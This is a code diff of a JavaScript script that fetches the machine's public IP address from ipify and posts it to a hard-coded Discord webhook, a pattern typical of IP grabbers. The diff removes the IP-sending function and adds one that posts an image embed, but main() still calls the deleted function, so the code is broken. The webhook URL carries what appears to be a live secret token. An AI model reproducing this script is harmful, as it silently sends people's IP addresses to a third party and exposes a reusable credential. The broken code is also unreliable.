@@ -1,9 +1,6 @@
 
 const ipifyAPI = "https://api.ipify.org?format=json";
-
-
 const webhookURL = "https://discordapp.com/api/webhooks/1548627600061235311/0P_pT9nlRqtxX_ladYn3hJhnY8MxUqoAZjEQnexylIUTliPb_lhYHyllVWN80zXd4ZSX";
-
 
 async function getIP() {
     try {
@@ -16,14 +13,19 @@ async function getIP() {
     }
 }
 
-async function sendToDiscord(ip) {
-    if (!ip) {
-        console.error("IP address is null or undefined.");
-        return;
-    }
-
+async function sendImageToDiscord() {
     const payload = {
-        content: `IP Address: ${ip}`
+        content: "Here's the image:",
+        embeds: [
+            {
+                title: "Image",
+                description: "This is an example image.",
+                url: "https://vergemagazine.co.uk/wp-content/uploads/2025/10/Screenshot-2025-10-09-235055-e1760050295687.jpg",
+                image: {
+                    url: "https://vergemagazine.co.uk/wp-content/uploads/2025/10/Screenshot-2025-10-09-235055-e1760050295687.jpg"
+                }
+            }
+        ]
     };
 
     try {
@@ -36,22 +38,24 @@ async function sendToDiscord(ip) {
         });
 
         if (response.ok) {
-            console.log("IP sent to Discord successfully!");
+            console.log("Image sent to Discord successfully!");
         } else {
-            console.error("Error sending IP to Discord:", response.statusText);
+            console.error("Error sending image to Discord:", response.statusText);
         }
     } catch (error) {
         console.error("Error:", error);
     }
 }
 
-
 async function main() {
     const ip = await getIP();
     if (ip) {
-        await sendToDiscord(ip);
+        // Wyślij adres IP na Discorda
+        sendToDiscord(ip);
+
+        // Wyślij obraz na Discorda
+        sendImageToDiscord();
     }
 }
-
 
 main();
